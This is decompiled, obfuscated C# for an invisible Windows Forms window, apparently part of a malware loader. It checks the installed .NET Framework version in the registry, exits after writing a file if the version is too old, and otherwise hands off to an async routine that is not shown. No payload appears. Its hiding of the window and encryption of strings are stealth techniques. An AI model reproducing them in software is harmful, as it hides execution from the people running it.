using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

public sealed class GForm0 : Form
{
	[StructLayout(LayoutKind.Auto)]
	private struct Struct3 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncVoidMethodBuilder asyncVoidMethodBuilder_0;

		public GForm0 gform0_0;

		private TaskAwaiter taskAwaiter_0;

		private void MoveNext()
		{
			int num = int_0;
			GForm0 gForm = gform0_0;
			try
			{
				TaskAwaiter awaiter;
				if (num != 0)
				{
					gForm.method_2();
					awaiter = gForm.method_0().method_16().GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						int_0 = 0;
						taskAwaiter_0 = awaiter;
						asyncVoidMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = taskAwaiter_0;
					taskAwaiter_0 = default(TaskAwaiter);
					num = -1;
					int_0 = -1;
				}
				awaiter.GetResult();
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncVoidMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncVoidMethodBuilder_0.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncVoidMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	private GClass1 gclass1_0;

	private IContainer icontainer_0;

	public GForm0()
	{
		method_4();
		method_1(new GClass1());
	}

	public GClass1 method_0()
	{
		return gclass1_0;
	}

	public void method_1(GClass1 gclass1_1)
	{
		gclass1_0 = gclass1_1;
	}

	private void method_2()
	{
		using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(Class4.smethod_0(1550578890));
		int int_ = Convert.ToInt32(registryKey.GetValue(Class4.smethod_0(1550578944)));
		if (method_3(int_) == Class4.smethod_0(1550577709))
		{
			File.WriteAllText(Class4.smethod_0(1550578962), Class4.smethod_0(1550578984));
			Application.Exit();
		}
	}

	private string method_3(int int_0)
	{
		if (int_0 >= 461808)
		{
			return Class4.smethod_0(1550579043);
		}
		if (int_0 >= 461308)
		{
			return Class4.smethod_0(1550579062);
		}
		if (int_0 >= 460798)
		{
			return Class4.smethod_0(1550579081);
		}
		if (int_0 >= 394802)
		{
			return Class4.smethod_0(1550579102);
		}
		if (int_0 >= 394254)
		{
			return Class4.smethod_0(1550579121);
		}
		if (int_0 >= 393295)
		{
			return Class4.smethod_0(1550579140);
		}
		if (int_0 >= 393273)
		{
			return Class4.smethod_0(1550579161);
		}
		if (int_0 >= 379893)
		{
			return Class4.smethod_0(1550579187);
		}
		if (int_0 >= 378675)
		{
			return Class4.smethod_0(1550580230);
		}
		if (int_0 >= 378389)
		{
			return Class4.smethod_0(1550580249);
		}
		return Class4.smethod_0(1550577709);
	}

	private async void GForm0_Load(object sender, EventArgs e)
	{
		method_2();
		await method_0().method_16();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_4()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(Class4.smethod_0(1550580270));
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(Class4.smethod_0(1550580283));
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
	}
}
